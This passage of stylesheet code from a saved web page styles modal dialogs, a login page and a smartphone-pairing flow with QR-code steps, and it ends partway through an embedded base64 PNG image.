        line-height: 26px;
        position: absolute;
        right: 3px;
        text-align: center;
        top: 3px;
        width: 30px;
      }
      .ngdialog.ngdialog-theme-plain .ngdialog-close:active:before,
      .ngdialog.ngdialog-theme-plain .ngdialog-close:hover:before {
        color: #777;
      }
      .ngdialog.ngdialog-theme-plain .ngdialog-message {
        margin-bottom: 0.5em;
      }
      .ngdialog.ngdialog-theme-plain .ngdialog-input {
        margin-bottom: 1em;
      }
      .ngdialog.ngdialog-theme-plain .ngdialog-input input[type="text"],
      .ngdialog.ngdialog-theme-plain .ngdialog-input input[type="password"],
      .ngdialog.ngdialog-theme-plain .ngdialog-input input[type="email"],
      .ngdialog.ngdialog-theme-plain .ngdialog-input input[type="url"],
      .ngdialog.ngdialog-theme-plain .ngdialog-input textarea {
        background: #f0f0f0;
        border: 0;
        font-family: inherit;
        font-size: inherit;
        font-weight: inherit;
        margin: 0 0 0.25em;
        min-height: 2.5em;
        padding: 0.25em 0.67em;
        width: 100%;
      }
      .ngdialog.ngdialog-theme-plain .ngdialog-input input[type="text"]:focus,
      .ngdialog.ngdialog-theme-plain .ngdialog-input input[type="password"]:focus,
      .ngdialog.ngdialog-theme-plain .ngdialog-input input[type="email"]:focus,
      .ngdialog.ngdialog-theme-plain .ngdialog-input input[type="url"]:focus,
      .ngdialog.ngdialog-theme-plain .ngdialog-input textarea:focus {
        box-shadow: inset 0 0 0 2px rgba(0, 0, 0, 0.2);
        outline: 0;
      }
      .ngdialog.ngdialog-theme-plain .ngdialog-buttons:after {
        clear: both;
        content: "";
        display: table;
      }
      .ngdialog.ngdialog-theme-plain .ngdialog-button {
        border: 0;
        cursor: pointer;
        float: right;
        font-family: inherit;
        font-size: 0.8em;
        letter-spacing: 0.1em;
        line-height: 1em;
        margin: 0 0 0 0.5em;
        padding: 0.75em 2em;
        text-transform: uppercase;
      }
      .ngdialog.ngdialog-theme-plain .ngdialog-button:focus {
        -webkit-animation: ngdialog-pulse 1.1s infinite;
        animation: ngdialog-pulse 1.1s infinite;
        outline: 0;
      }
      @media (max-width: 568px) {
        .ngdialog.ngdialog-theme-plain .ngdialog-button:focus {
          -webkit-animation: none;
          animation: none;
        }
      }
      .ngdialog.ngdialog-theme-plain .ngdialog-button.ngdialog-button-primary {
        background: #3288e6;
        color: #fff;
      }
      .ngdialog.ngdialog-theme-plain .ngdialog-button.ngdialog-button-secondary {
        background: #e0e0e0;
        color: #777;
      }
      @-webkit-keyframes ngdialog-flyin {
        0% {
          opacity: 0;
          -webkit-transform: translateY(-40px);
          transform: translateY(-40px);
        }
        100% {
          opacity: 1;
          -webkit-transform: translateY(0);
          transform: translateY(0);
        }
      }
      @keyframes ngdialog-flyin {
        0% {
          opacity: 0;
          -webkit-transform: translateY(-40px);
          transform: translateY(-40px);
        }
        100% {
          opacity: 1;
          -webkit-transform: translateY(0);
          transform: translateY(0);
        }
      }
      @-webkit-keyframes ngdialog-flyout {
        0% {
          opacity: 1;
          -webkit-transform: translateY(0);
          transform: translateY(0);
        }
        100% {
          opacity: 0;
          -webkit-transform: translateY(-40px);
          transform: translateY(-40px);
        }
      }
      @keyframes ngdialog-flyout {
        0% {
          opacity: 1;
          -webkit-transform: translateY(0);
          transform: translateY(0);
        }
        100% {
          opacity: 0;
          -webkit-transform: translateY(-40px);
          transform: translateY(-40px);
        }
      }
      .ngdialog.ngdialog-theme-default {
        padding-bottom: 160px;
        padding-top: 160px;
      }
      .ngdialog.ngdialog-theme-default.ngdialog-closing .ngdialog-content {
        -webkit-animation: ngdialog-flyout 0.5s;
        animation: ngdialog-flyout 0.5s;
      }
      .ngdialog.ngdialog-theme-default .ngdialog-content {
        -webkit-animation: ngdialog-flyin 0.5s;
        animation: ngdialog-flyin 0.5s;
        background: #f0f0f0;
        border-radius: 5px;
        color: #444;
        font-family: Helvetica, sans-serif;
        font-size: 1.1em;
        line-height: 1.5em;
        margin: 0 auto;
        max-width: 100%;
        padding: 1.5em;
        position: relative;
        width: 450px;
      }
      .ngdialog.ngdialog-theme-default .ngdialog-close {
        border-radius: 5px;
        cursor: pointer;
        position: absolute;
        right: 0;
        top: 0;
      }
      .ngdialog.ngdialog-theme-default .ngdialog-close:before {
        background: 0 0;
        border-radius: 3px;
        color: #bbb;
        content: "\00D7";
        font-size: 26px;
        font-weight: 400;
        height: 30px;
        line-height: 26px;
        position: absolute;
        right: 3px;
        text-align: center;
        top: 3px;
        width: 30px;
      }
      .ngdialog.ngdialog-theme-default .ngdialog-close:active:before,
      .ngdialog.ngdialog-theme-default .ngdialog-close:hover:before {
        color: #777;
      }
      .ngdialog.ngdialog-theme-default .ngdialog-message {
        margin-bottom: 0.5em;
      }
      .ngdialog.ngdialog-theme-default .ngdialog-input {
        margin-bottom: 1em;
      }
      .ngdialog.ngdialog-theme-default .ngdialog-input input[type="text"],
      .ngdialog.ngdialog-theme-default .ngdialog-input input[type="password"],
      .ngdialog.ngdialog-theme-default .ngdialog-input input[type="email"],
      .ngdialog.ngdialog-theme-default .ngdialog-input input[type="url"],
      .ngdialog.ngdialog-theme-default .ngdialog-input textarea {
        background: #fff;
        border: 0;
        border-radius: 3px;
        font-family: inherit;
        font-size: inherit;
        font-weight: inherit;
        margin: 0 0 0.25em;
        min-height: 2.5em;
        padding: 0.25em 0.67em;
        width: 100%;
      }
      .ngdialog.ngdialog-theme-default .ngdialog-input input[type="text"]:focus,
      .ngdialog.ngdialog-theme-default .ngdialog-input input[type="password"]:focus,
      .ngdialog.ngdialog-theme-default .ngdialog-input input[type="email"]:focus,
      .ngdialog.ngdialog-theme-default .ngdialog-input input[type="url"]:focus,
      .ngdialog.ngdialog-theme-default .ngdialog-input textarea:focus {
        box-shadow: inset 0 0 0 2px #8dbdf1;
        outline: 0;
      }
      .ngdialog.ngdialog-theme-default .ngdialog-buttons:after {
        content: "";
        display: table;
        clear: both;
      }
      .ngdialog.ngdialog-theme-default .ngdialog-button {
        border: 0;
        border-radius: 3px;
        cursor: pointer;
        float: right;
        font-family: inherit;
        font-size: 0.8em;
        letter-spacing: 0.1em;
        line-height: 1em;
        margin: 0 0 0 0.5em;
        padding: 0.75em 2em;
        text-transform: uppercase;
      }
      .ngdialog.ngdialog-theme-default .ngdialog-button:focus {
        -webkit-animation: ngdialog-pulse 1.1s infinite;
        animation: ngdialog-pulse 1.1s infinite;
        outline: 0;
      }
      @media (max-width: 568px) {
        .ngdialog.ngdialog-theme-default .ngdialog-button:focus {
          -webkit-animation: none;
          animation: none;
        }
      }
      .ngdialog.ngdialog-theme-default .ngdialog-button.ngdialog-button-primary {
        background: #3288e6;
        color: #fff;
      }
      .ngdialog.ngdialog-theme-default .ngdialog-button.ngdialog-button-secondary {
        background: #e0e0e0;
        color: #777;
      }
    </style>
    <style >
      body {
        font-family: Open Sans, Tahoma, Geneva, sans-serif;
        min-width: 1024px;
        overflow-x: hidden;
      }

      .mainDiv.ng-hide {
        opacity: 0;
      }

      .mainDiv.ng-hide-add,
      .mainDiv.ng-hide-remove {
        transition: all linear 1s;
      }

      .mainLoader {
        margin-top: 50vh;
        transform: translate(50%, -50%);
      }

      .header {
        padding: 10px;
      }

      .footer {
        padding-top: 20px;
      }

      .headerLogo {
        cursor: pointer;
      }

      .content {
        background-color: #f0f2f0;
        padding-top: 30px;
        border-top: solid 1px;
        border-bottom: solid 1px;
      }

      .content .jumbotron {
        background-color: #ffffff;
      }

      .iconsBar {
        text-align: right;
        color: #1d1753;
        padding-top: 20px;
        font-size: 16px;
        padding-right: 60px;
      }

      .iconsBar .icon {
        cursor: pointer;
      }

      button.btn {
        background-color: #007858;
        color: #ffffff;
      }

      label.btn {
        background-color: #007858;
        color: #ffffff;
      }

      .languageListSelect {
        margin-top: 20px;
        margin-right: 5px;
        width: 200px;
      }

      .languageListSelect span {
        font-size: 12px;
      }

      .helpConnectSection {
        margin-top: 20px;
      }

      .helpConnectSection div {
        text-align: center;
      }

      .helpConnectLink {
        cursor: pointer;
        margin-top: 10px;
        margin-bottom: 10px;
        font-size: 14px;
        text-decoration: underline;
      }

      .contactSection div {
        text-align: center;
      }

      .has-error span {
        color: #a94442;
      }

      .contactForm .label-column {
        text-align: left;
      }

      .deviceChoice {
        background-color: #eeeeee;
        margin-top: 10px;
        margin-bottom: 10px;
        margin-left: 10px;
        margin-right: 10px;
      }

      .listDevices {
        margin-top: 30px;
        margin-bottom: 30px;
      }

      .deviceChoice span {
        display: table-cell;
        vertical-align: middle;
        padding: 10px;
        text-align: left;
      }

      .flexitokenForm button {
        width: 100%;
      }

      .smartphoneForm button {
        width: 100%;
      }

      .loginPage button[type="submit"] {
        width: 100%;
      }

      .loginPage i {
        font-size: 1.5em;
      }

      .linksRow {
        padding-top: 10px;
        padding-bottom: 10px;
      }

      .linksRow a {
        color: black;
      }

      .linksRow > * {
        margin-left: 20px;
        margin-right: 20px;
        display: inline-block;
      }

      .filesRow {
        padding-top: 10px;
        padding-bottom: 10px;
      }

      .filesRow a {
        color: black;
      }

      .filesRow > * {
        margin-left: 20px;
        margin-right: 20px;
        display: inline-block;
      }

      .fileVideo {
        cursor: pointer;
        color: black;
      }

      .fileVideo:hover {
        text-decoration: underline;
      }

      .welcomeParagraph {
        margin-top: 20px;
      }

      .alertBox {
        margin-top: 20px;
      }

      .modal-danger {
        color: #a94442;
        background-color: #f2dede;
      }

      .modal-info {
        color: #31708f;
        background-color: #d9edf7;
      }

      ol.breadcrumb {
        background-color: transparent;
        width: 100%;
      }

      ol.breadcrumb li {
        width: 33%;
      }

      ol.breadcrumb li span {
        width: 100%;
      }

      .breadcrumb-arrow {
        height: 36px;
        padding: 0;
        line-height: 36px;
        list-style: none;
      }
      .breadcrumb-arrow li:first-child span {
        border-radius: 4px 0 0 4px;
        -webkit-border-radius: 4px 0 0 4px;
        -moz-border-radius: 4px 0 0 4px;
      }
      .breadcrumb-arrow li,
      .breadcrumb-arrow li span {
        display: inline-block;
        vertical-align: top;
      }
      .breadcrumb-arrow li:not(:first-child) {
        margin-left: -5px;
        padding-right: 10px;
      }

      .breadcrumb-arrow li + li:before {
        padding: 0;
        content: "";
      }

      .breadcrumb-arrow li span {
        height: 36px;
        padding: 0 10px 0 25px;
        line-height: 36px;
      }
      .breadcrumb-arrow li:first-child span {
        padding: 0 10px;
      }
      .breadcrumb-arrow li span {
        position: relative;
        text-decoration: none;
      }
      .breadcrumb-arrow li:first-child span {
        padding-left: 10px;
      }
      .breadcrumb-arrow li span:after,
      .breadcrumb-arrow li span:before {
        position: absolute;
        top: -1px;
        width: 0;
        height: 0;
        content: "";
        border-top: 18px solid transparent;
        border-bottom: 18px solid transparent;
      }
      .breadcrumb-arrow li span:before {
        right: -10px;
        z-index: 3;
        border-left-style: solid;
        border-left-width: 11px;
      }
      .breadcrumb-arrow li span:after {
        right: -11px;
        z-index: 2;
        border-left: 11px solid #ffffff;
      }

      .breadcrumb-arrow li.active span {
        font-weight: 900;
        opacity: 1;
      }

      ol.breadcrumb-arrow {
        display: inline-block;
        text-align: center;
        opacity: 0.7;
      }

      .breadcrumb-container {
        position: relative;
        display: block;
        text-align: center;
      }

      .google-play-icon {
        margin-top: 18px;
        height: 64px;
      }

      .itunes-store-icon {
        margin-top: 18px;
        height: 62px;
      }

      .app-stores {
        margin-top: 40px;
        margin-bottom: 40px;
        text-align: center;
      }

      .btn-previous span,
      .btn-previous i,
      .btn-next span,
      .btn-next i {
        display: table-cell;
        vertical-align: middle;
      }

      .container-btn-next {
        text-align: right;
      }

      .container-btns {
        margin-top: 10px;
        margin-bottom: 20px;
      }

      .scanQRLabelsRow {
        margin-bottom: 20px;
      }

      .scanQRArrow {
        padding-top: 100px;
        text-align: center;
      }

      .scanQRImage .phone-scanQRCode {
        position: relative;
        width: 159px;
        height: 304px;
        margin-left: auto;
        margin-right: auto;
      }

      .scanQRImage .phone-scanQRCode .background {
        position: absolute;
        width: 100%;
        height: 100%;
        background-image: /*savepage-url=../../images/phone-scanQRCode.png*/ url();
        top: 0;
        left: 0;
        z-index: 9;
        background-repeat: no-repeat;
      }

      .scanQRImage .qrCodeImage {
        position: relative;
        width: 250px;
        height: 352px;
        margin-left: auto;
        margin-right: auto;
      }

      .scanQRImage .qrCodeImage .background {
        position: absolute;
        width: 100%;
        height: 100%;
        background-image: /*savepage-url=../../images/QRCode.png*/ url();
        top: 0;
        left: 0;
        z-index: 9;
        background-repeat: no-repeat;
      }

      .scanQRImage .qrCodeImage .imageContent {
        position: absolute;
        width: 100%;
        height: 100%;
        top: 0;
        left: 0;
        display: table;
        z-index: 10;
      }

      .scanQRImage .qrCodeImage .imageContent span {
        font-size: 32px;
        display: table-cell;
        vertical-align: middle;
        text-align: center;
        transform: rotate(-30deg);
        color: black;
      }

      .courrier-generique {
        position: relative;
        width: 280px;
        height: 400px;
        margin-left: auto;
        margin-right: auto;
      }

      .courrier-generique .background {
        position: absolute;
        width: 100%;
        height: 100%;
        background-image: /*savepage-url=../../images/courrier_generique.png*/ url();
        top: 0;
        left: 0;
        z-index: 9;
        background-repeat: no-repeat;
      }

      .phone-manualQRCode {
        position: relative;
        width: 159px;
        height: 304px;
        margin-left: auto;
        margin-right: auto;
      }

      .phone-manualQRCode .background {
        position: absolute;
        width: 100%;
        height: 100%;
        background-image: /*savepage-url=../../images/phone-manualQRCode.png*/ url();
        top: 0;
        left: 0;
        z-index: 9;
        background-repeat: no-repeat;
      }

      .cannotScanQRLabelsRow {
        margin-bottom: 20px;
        text-align: center;
      }

      .cannotScanQRTitle {
        margin-bottom: 20px;
      }

      .cannotScanQRForm input {
        margin-top: 30px;
        margin-bottom: 30px;
      }

      .cannotScanQRFormFields {
        position: relative;
        width: 320px;
        height: 160px;
        margin-left: auto;
        margin-right: auto;
      }

      .cannotScanQRFormFields .specimen {
        position: absolute;
        top: 0;
        left: 0;
        font-size: 32px;
        display: table;
        z-index: 10;
        width: 100%;
        height: 100%;
        color: black;
      }

      .cannotScanQRFormFields .specimen span {
        font-size: 32px;
        font-family: Verdana;
        display: table-cell;
        vertical-align: middle;
        text-align: center;
        transform: rotate(-30deg);
      }

      .scanQRCodeLink {
        text-align: center;
      }

      .smartphonePaired {
        text-align: center;
      }

      .smartphonePaired i.fa-check {
        color: green;
      }

      .laststep .center {
        text-align: center;
      }

      .howToSmartphonePage .mainContainer {
        margin-left: 5px;
        margin-right: 5px;
      }

      .howToSmartphonePage a.link {
        text-decoration: underline;
      }

      div.eyePassword i {
        font-size: 1em;
      }

      div.eyePassword span {
        cursor: pointer;
      }

      div.eyePassword .transcluded input:first-child {
        border-top-left-radius: 4px;
        border-bottom-left-radius: 4px;
      }

      input[type="password"]::-ms-reveal,
      input[type="password"]::-ms-clear {
        display: none;
      }

      .form-horizontal .control-label {
        text-align: left;
      }

      .text-label {
        padding-top: 7px;
      }

      .mb-20 {
        margin-bottom: 20px;
      }

      .mx-20 {
        margin-right: 20px;
      }

      .spinner-overlay {
        opacity: 0.5;
        background: #000;
        height: 100%;
        z-index: 10;
        top: 0;
        left: 0;
        position: fixed;
        display: flex;
        width: 100%;
      }

      .spinner-item {
        width: 100%;
      }

      textarea {
        resize: vertical;
      }
    </style>
    <style >
      .iconsBar {
        text-align: center;
      }

      .iconsBar .icon {
        margin-bottom: 20px;
      }

      button.btn {
        opacity: 1 !important;
        background-color: rgb(29, 79, 126);
        color: rgb(255, 255, 255);
      }

      button[name="contactFormBtn"] {
        background-color: rgb(29, 79, 126);
        color: rgb(255, 255, 255);
        width: 100%;
      }
    </style>

    <style id="savepage-cssvariables">
      :root {
        --savepage-url-7: url(data:image/png;base64,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